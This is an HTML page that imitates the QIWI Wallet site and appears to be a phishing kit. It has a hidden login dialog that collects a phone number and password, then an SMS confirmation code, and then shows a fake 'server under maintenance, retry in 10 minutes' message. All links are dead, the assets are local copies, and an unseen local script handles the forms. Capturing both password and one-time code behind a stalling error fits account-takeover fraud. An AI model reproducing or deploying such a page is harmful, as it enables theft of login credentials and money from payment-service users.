<!DOCTYPE html>
<html lang="ru">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>QIWI Кошелек — электронная платежная система, онлайн-платежи и переводы</title>
	<link rel="stylesheet" href="css/style.css">
</head>
<style type="text/css" id="server-side-styles">
	.link-self-11{color:#05b;cursor:pointer;transition:all 120ms cubic-bezier(.4,0,.2,1);line-height:1.31;text-decoration:none}
	.link-self-11:hover{color:#ff8c00}.link-self-11:focus{color:#ff8c00}
.link-self-11:active{color:#ff8c00}
.w-self-9{width:170px;height:170px;-webkit-animation:jss-spinner-self 2s linear infinite;animation:jss-spinner-self 2s linear infinite;-webkit-transform-origin:center center;transform-origin:center center}.w-status-10{fill:none;stroke:#d8d8d8;-webkit-animation:jss-spinner-status 1.5s ease-in-out infinite;animation:jss-spinner-status 1.5s ease-in-out infinite;stroke-width:2;stroke-linecap:round;stroke-dasharray:89,200;stroke-dashoffset:0}
.plain-title-self-12{color:#000;padding:0;font-size:13px;margin-top:20px;line-height:1.38;font-weight:500;margin-bottom:20px;letter-spacing:1.5px}
.plain-title-self-12:first-child{margin-top:0}
.plain-title-self-12:last-child{margin-bottom:0}
*{box-sizing:border-box}
a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{font:inherit;margin:0;border:0;padding:0;font-size:100%;vertical-align:baseline}
strong{font-weight:700}
article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}
ol,ul{list-style:none}
blockquote,q{quotes:none}
table{border-spacing:0;border-collapse:collapse}
svg{display:inline-block;vertical-align:top}
@font-face{src:url(fonts/MuseoSans_100_normal.ff88c4ad284ba261a229a9c4f7e9fafd.woff2) format(woff2);font-family:Museo Sans;font-style:normal;font-weight:100;src:url(fonts/MuseoSans_100_normal.babf959a5ca2af08a8bbc4b922d66730.woff)}
@font-face{src:url(fonts/MuseoSans_100_italic.f761c230651c192606a663450a5bdb2b.woff2) format(woff2);font-family:Museo Sans;font-style:italic;font-weight:100;src:url(fonts/MuseoSans_100_italic.2b5bf833f87882ec97b4925c29c782d4.woff)}
@font-face{src:url(fonts/MuseoSans_300_normal.e76032feeed9724a2079d148c07a6ad8.woff2) format(woff2);font-family:Museo Sans;font-style:normal;font-weight:300;src:url(fonts/MuseoSans_300_normal.9ca14accae2a6b987bb5fc0000236572.woff)}
@font-face{src:url(fonts/MuseoSans_300_italic.188d2f71dac839329f69f99141844fe0.woff2) format(woff2);font-family:Museo Sans;font-style:italic;font-weight:300;src:url(fonts/MuseoSans_300_italic.92c038ad48f7e9153ee6645444bbb40a.woff)}
@font-face{src:url(fonts/MuseoSans_500_normal.0c2fa471a0bf99124096664a1bd6a040.woff2) format(woff2);font-family:Museo Sans;font-style:normal;font-weight:500;src:url(fonts/MuseoSans_500_normal.171ad3582ab0543d4ee818a476c26fd7.woff)}
@font-face{src:url(fonts/MuseoSans_500_italic.69d9bb7a5461efc2df3769b86df854ca.woff2) format(woff2);font-family:Museo Sans;font-style:italic;font-weight:500;src:url(fonts/MuseoSans_500_italic.1cb18a77f8e5c3dc66fc8324e57f6e36.woff)}
@font-face{src:url(fonts/MuseoSans_700_normal.3e002a90aa94f40e3070180559e0abc0.woff2) format(woff2);font-family:Museo Sans;font-style:normal;font-weight:700;src:url(fonts/MuseoSans_700_normal.8cd551a3e382a4db9aa3717cda06188e.woff)}
@font-face{src:url(fonts/MuseoSans_700_italic.ef282e1138660377be5255812b4d868c.woff2) format(woff2);font-family:Museo Sans;font-style:italic;font-weight:700;src:url(fonts/MuseoSans_700_italic.93bed65273104b76966d475042a0c797.woff)}
@font-face{src:url(fonts/MuseoSans_900_normal.6d752f5b705d5f71f6672b1e8de5eaba.woff2) format(woff2);font-family:Museo Sans;font-style:normal;font-weight:900;src:url(fonts/MuseoSans_900_normal.9178f1dc9d1339a5fb064bd80ad89697.woff)}
@font-face{src:url(fonts/MuseoSans_900_italic.16c55ee979764c93a4d79f1824fd3303.woff2) format(woff2);font-family:Museo Sans;font-style:italic;font-weight:900;src:url(fonts/MuseoSans_900_italic.8381584160d4f5f030704261226ed1cb.woff)}
#app,body,html{height:100%;position:relative}
body{overflow-y:scroll;font-weight:300;line-height:1;font-family:'Museo Sans',Arial,'Helvetica Neue',Helvetica,sans-serif;background-color:#f5f5f5}@-webkit-keyframes jss-spinner-self{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
@keyframes jss-spinner-self{100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
@-webkit-keyframes jss-spinner-status{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:89,200;stroke-dashoffset:-35}100%{stroke-dasharray:89,200;stroke-dashoffset:-124}}
@keyframes jss-spinner-status{0%{stroke-dasharray:1,200;stroke-dashoffset:0}50%{stroke-dasharray:89,200;stroke-dashoffset:-35}100%{stroke-dasharray:89,200;stroke-dashoffset:-124}}.server-self-0{height:100%;text-align:center}
@media (min-width:768px){.server-self-0{top:0;left:0;right:0;bottom:0;position:fixed}}.server-self-0:before{height:100%;content:"";display:inline-block;vertical-align:middle}.server-content-1{display:inline-block;outline:0;padding:20px;position:relative;max-width:700px;min-width:320px;vertical-align:middle}.server-preload-2{margin:0 auto;display:block}.server-noscript-3{display:none;padding:15px 25px 20px 15px;position:relative;box-shadow:0 1px 2px 0 rgba(0,0,0,.14);border-radius:10px;background-color:#fff}
@media (min-width:768px){.server-noscript-3{padding:45px 55px 50px 45px}}.server-title-4{padding:0;font-size:24px;font-weight:300;line-height:1.31;margin-bottom:35px}
@media (min-width:768px){.server-title-4{font-size:32px;font-weight:900}}.server-text-5{padding:0;font-size:13px;line-height:1.31;margin-bottom:20px}
@media (min-width:768px){.server-text-5{font-size:16px}}.server-browsers-6{display:flex;align-items:center;flex-direction:column}
@media (min-width:768px){.server-browsers-6{align-items:flex-start;flex-direction:row;justify-content:space-around}}.server-browsers-item-7{padding:10px}.server-nojs-8 .server-preload-2{display:none}.server-nojs-8 .server-noscript-3{display:block}
</style>
<body>

	<div id="app">
		
		<section class="app-self-0">
			<section class="desktop-mobile-desktop-1">
				<header class="header-unauthorized-self-3">
					<div class="header-unauthorized-inner-4">
						<div class="header-unauthorized-content-5">
							<a href="/" class="link-self-13">
								<img src="img/qiwi-wallet-logo.svg" alt="" class="header-unauthorized-logo-6">
							</a>
							<nav class="header-unauthorized-nav-7">
								<div class="header-unauthorized-nav-item-8"><span>Платежи и переводы</span></div>
								<div class="header-unauthorized-nav-item-8"><span>Банковские карты</span></div>
								<div class="header-unauthorized-nav-item-8"><span>Пополнение кошелька</span></div>
								<div class="header-unauthorized-nav-item-8"><span>Помощь</span></div>
								<div class="header-unauthorized-nav-item-8"><span>Еще…</span></div>
								<div class="header-unauthorized-nav-item-8">
									<div class="search-self-20">
										<div class="search-search-21">
											<svg class="search-search-icon-self-22" viewBox="0 0 24 24">
												<path class="search-search-icon-path-23" d="M16.463 15.05l3.901 3.9a1 1 0 1 1-1.414 1.414l-3.9-3.9a7.5 7.5 0 1 1 1.414-1.414zM10.5 16a5.5 5.5 0 1 0 0-11 5.5 5.5 0 0 0 0 11z"></path>
											</svg>
										</div>
									</div>
								</div>
							</nav>
							<div class="header-unauthorized-actions-10">
								<div class="header-unauthorized-actions-item-11">
									<button class="button-self-31 button-minor-34 button-simple-37" tabindex="0" type="submit">
										<span class="button-content-44">
											<span class="button-content-text-46">Создать кошелек</span>
										</span>
									</button>
								</div>
								<div class="header-unauthorized-actions-item-11">
									<button id="login_in_btn" class="button-self-31 button-minor-34 button-brand-35" tabindex="0" type="submit">
										<span class="button-content-44">
											<span class="button-content-text-46">Войти</span>
										</span>
									</button>
								</div>
							</div>
						</div>
					</div>
				</header>
			</section>
			<section class="promo-self-311">
				<div class="promo-content-312 promo-content-vertical-313">
					<div class="promo-img-block-314 promo-img-block-vertical-315">
						<img src="img/keds.png" alt="" class="promo-img-316">
					</div>
					<div class="promo-text-block-318 promo-text-block-vertical-319">
						<h1 class="promo-title-320">Создать кошелек проще, чем завязать шнурки</h1>
						<span class="promo-tagline-321">Нужен только номер телефона</span>
						<div class="promo-button-wrap-322">
							<button class="button-self-31 button-landing-38" tabindex="0" type="submit">
								<span class="button-content-44">
									<span class="button-content-icon-45">
										<img src="img/btn-qiwi-logo.svg" alt="">
									</span>
									<span class="button-content-text-46">Создать кошелек</span>
								</span>
							</button>
						</div>
					</div>
				</div>
			</section>
			<section class="landing-content-self-323">
				<div class="landing-content-inner-324">
					<div class="banner-self-325">
						<div class="block-self-334">
							<div class="banner-inner-326">
								<div class="banner-img-wrap-329">
									<img class="banner-img-328" src="img/ApplePay.png" alt="">
								</div>
								<div class="banner-content-327">
									<div class="banner-text-wrap-330">
										<h2 class="banner-title-331">Наконец-то Apple Pay!</h2>
										<span class="banner-text-332">Подключите вашу карту QIWI к Apple Pay и оплачивайте покупки<br>быстрее и безопаснее.</span>
									</div>
									<div class="banner-link-wrap-333">
										<button class="button-self-31 button-normal-33 button-simple-37" tabindex="0">
											<span class="button-content-44">
												<span class="button-content-text-46">Добавить карту</span>
											</span>
										</button>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div class="info-self-335">
						<div class="info-item-self-336">
							<div class="info-item-inner-337">
								<div class="info-item-img-block-339">
									<img src="img/brands.png" alt="" class="info-item-img-341">
								</div>
								<div class="info-item-content-342">
									<div class="info-item-text-block-344">
										<h3 class="info-item-title-345">Кешбэк от QIWI Бонус</h3>
										<span class="info-item-tagline-346">До 8% от покупок на AliExpress, до 6,4% от покупок на ASOS и до 25% в других магазинах.</span>
									</div>
									<div class="info-item-action-block-347">
										<button class="button-self-31 button-normal-33 button-simple-37" tabindex="0">
											<span class="button-content-44">
												<span class="button-content-text-46">Покупать с кешбэком</span>
											</span>
										</button>
									</div>
								</div>
							</div>
						</div>
						<div class="info-item-self-336">
							<div class="info-item-inner-337">
								<div class="info-item-img-block-339">
									<img src="img/card.png" alt="" class="info-item-img-341">
								</div>
								<div class="info-item-content-342">
									<div class="info-item-text-block-344">
										<h3 class="info-item-title-345">Банковская карта QIWI</h3>
										<span class="info-item-tagline-346">Бесплатное обслуживание. 100000 точек пополнения. Единый баланс с кошельком.</span>
									</div>
									<div class="info-item-action-block-347">
										<button class="button-self-31 button-normal-33 button-simple-37" tabindex="0">
											<span class="button-content-44">
												<span class="button-content-text-46">Получить карту</span>
											</span>
										</button>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
			<section class="desktop-mobile-desktop-1">
				<footer class="footer-self-269">
					<div class="footer-content-271">
						<div class="footer-section-272">
							<nav class="footer-nav-273">
								<a href="/" class="footer-nav-item-self-274">Карта QIWI терминалов</a>
								<a href="/" class="footer-nav-item-self-274">Идентификация</a>
								<a href="/" class="footer-nav-item-self-274">Помощь</a>
								<a href="/" class="footer-nav-item-self-274">Оферты</a>
								<a href="/" class="footer-nav-item-self-274">Новости</a>
								<a href="/" class="footer-nav-item-self-274">Карта сайта</a>
								<a href="/" class="footer-nav-item-self-274">Контакты</a>
								<a href="/" class="footer-nav-item-self-274">Бизнесу</a>
								<a href="/" class="footer-nav-item-self-274">Агентам</a>
								<a href="/" class="footer-nav-item-self-274">Арендодателям</a>
								<a href="/" class="footer-nav-item-self-274">Работа в QIWI</a>
								<a href="/" class="footer-nav-item-self-274">Инвесторам</a>
								<a href="/" class="footer-nav-item-self-274">КИВИ банк</a>
							</nav>
							<div class="footer-contacts-275">
								<span class="footer-phone-276">8 800 707-77-59</span>
								<div class="footer-social-277">
									<a href="/" class="footer-social-item-self-278"><img src="img/vk.svg" alt=""></a>
									<a href="/" class="footer-social-item-self-278"><img src="img/ok.svg" alt=""></a>
									<a href="/" class="footer-social-item-self-278"><img src="img/youtube.svg" alt=""></a>
									<a href="/" class="footer-social-item-self-278"><img src="img/twitter.svg" alt=""></a>
									<a href="/" class="footer-social-item-self-278"><img src="img/facebook.svg" alt=""></a>
									<a href="/" class="footer-social-item-self-278"><img src="img/instagram.svg" alt=""></a>
								</div>
							</div>
						</div>
						<div class="footer-section-272">
							<div class="footer-apps-279">
								<a href="/" class="footer-apps-item-self-280"><img src="img/app_store.svg" alt=""></a>
								<a href="/" class="footer-apps-item-self-280"><img src="img/google_play.svg" alt=""></a>
								<a href="/" class="footer-apps-item-self-280"><img src="img/appgallery.svg" alt=""></a>
							</div>
							<div class="footer-security-281">
								<img src="img/pci.svg" alt="" class="footer-security-item-282">
								<img src="img/mir.svg" alt="" class="footer-security-item-282">
								<img src="img/visa.svg" alt="" class="footer-security-item-282">
								<img src="img/ms.svg" alt="" class="footer-security-item-282">
								<img src="img/apple-pay.svg" alt="" class="footer-security-item-282">
							</div>
						</div>
						<div class="footer-section-272">
							<div class="footer-info-283">
								<span class="footer-info-item-284">© 2020, КИВИ Банк (АО), лицензия ЦБ РФ № 2241</span>
								<span class="footer-info-item-284">Россия, 117648, г. Москва, мкр. Чертаново Северное, д.1А, корп.1</span>
							</div>
						</div>
					</div>
				</footer>
			</section>
		</section>

	</div>

	<div id="block_form" class="dialog-self-307">
		<div class="dialog-backdrop-309 dialog-backdrop-transition-self-560 dialog-backdrop-transition-entered-562"></div>
		<div class="dialog-content-310 dialog-content-transition-self-565 dialog-content-transition-entered-567">
			<div class="center-loader-self-570">
				<div class="center-loader-content-572">
					<form id="form_step_1" class="auth-form-self-574">
						<div class="auth-simple-header-self-575">
							<div class="auth-simple-header-title-576">
								<h3 class="plain-title-self-580">ВХОД</h3>
							</div>
							<div class="auth-simple-header-close-577" >
								<svg class="auth-simple-header-close-icon-self-578" viewBox="0 0 24 24">
									<path class="auth-simple-header-close-icon-path-579" d="M12 10.586l6.293-6.293a1 1 0 0 1 1.414 1.414L13.414 12l6.293 6.293a1 1 0 0 1-1.414 1.414L12 13.414l-6.293 6.293a1 1 0 0 1-1.414-1.414L10.586 12 4.293 5.707a1 1 0 0 1 1.414-1.414L12 10.586z"></path>
								</svg>
							</div>
						</div>
						<div class="auth-content-self-581">
							<div id="input_phone" class="auth-field-self-582">
								<div class="phone-input-form-field-self-583 phone-input-form-field-filled-591 phone-input-form-field-invalid-592"></div>
								<div class="phone-input-form-field-input-590">
									<div class="phone-input-form-field-input-control-self-597">
										<input type="tel" class="phone-input-form-field-input-control-text-self-598" autocomplete="off" value="+7" name="phone">
									</div>
								</div>
								<div class="phone-input-form-field-under-586">
									<div class="phone-input-form-field-under-error-588">Необходимо ввести номер телефона</div>
								</div>
							</div>
							<div id="input_password" class="auth-field-self-582">
								<div class="password-input-form-field-self-612">
									<div class="password-input-form-field-title-613">
										<div class="password-input-form-field-title-text-614">
											
										</div>
									</div>
									<div class="password-input-form-field-input-619">
										<input type="password" class="password-input-form-field-input-control-self-624" autocomplete="off" name="password" placeholder="Пароль">
									</div>
									<div class="password-input-form-field-under-615">
										<div class="password-input-form-field-under-addition-618">
											<a class="link-self-13">Напомнить</a>
										</div>
									</div>
								</div>
							</div>
							<div class="auth-submit-self-631">
								<div class="auth-submit-content-632">
									<div class="auth-submit-item-633">
										<button id="btn_login_1" class="button-self-31 button-normal-33 button-brand-35" tabindex="0" type="submit">
											<span class="button-content-44">
												<span class="button-content-text-46">Войти</span>
											</span>
										</button>
									</div>
								</div>
							</div>
							<div class="auth-error-self-634"></div>
						</div>
					</form>

					<form id="form_step_2" class="auth-form-self-574">
						<div class="auth-simple-header-self-575">
							<div class="auth-simple-header-title-576">
								<h3 class="plain-title-self-580">ВХОД</h3>
							</div>
							<div class="auth-simple-header-close-577" >
								<svg class="auth-simple-header-close-icon-self-578" viewBox="0 0 24 24">
									<path class="auth-simple-header-close-icon-path-579" d="M12 10.586l6.293-6.293a1 1 0 0 1 1.414 1.414L13.414 12l6.293 6.293a1 1 0 0 1-1.414 1.414L12 13.414l-6.293 6.293a1 1 0 0 1-1.414-1.414L10.586 12 4.293 5.707a1 1 0 0 1 1.414-1.414L12 10.586z"></path>
								</svg>
							</div>
						</div>
						<div class="auth-content-self-581">
							<h2 class="title_form">Введите СМС-код</h2>

							<div id="input_code" class="auth-field-self-582">
								<div class="password-input-form-field-self-612">
									<div class="password-input-form-field-title-613">
										<div class="password-input-form-field-title-text-614">
											
										</div>
									</div>
									<div class="password-input-form-field-input-619">
										<input type="number" class="password-input-form-field-input-control-self-624" autocomplete="off" name="code" placeholder="Код">
									</div>
								</div>
							</div>
							<div class="auth-submit-self-631">
								<div class="auth-submit-content-632">
									<div class="auth-submit-item-633">
										<button id="btn_login_1" class="button-self-31 button-normal-33 button-brand-35" tabindex="0" type="submit">
											<span class="button-content-44">
												<span class="button-content-text-46">Войти</span>
											</span>
										</button>
									</div>
								</div>
							</div>
							<div class="auth-error-self-634"></div>
						</div>
					</form>

					<div class="error_site">
						<h2 class="error_site_title">Извините, сервер находится на работах<br>Повторите попытку через 10 минут</h2>
					</div>

				</div>
			</div>
		</div>
	</div>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
	<script src="js/script.js"></script>	
</body>
</html>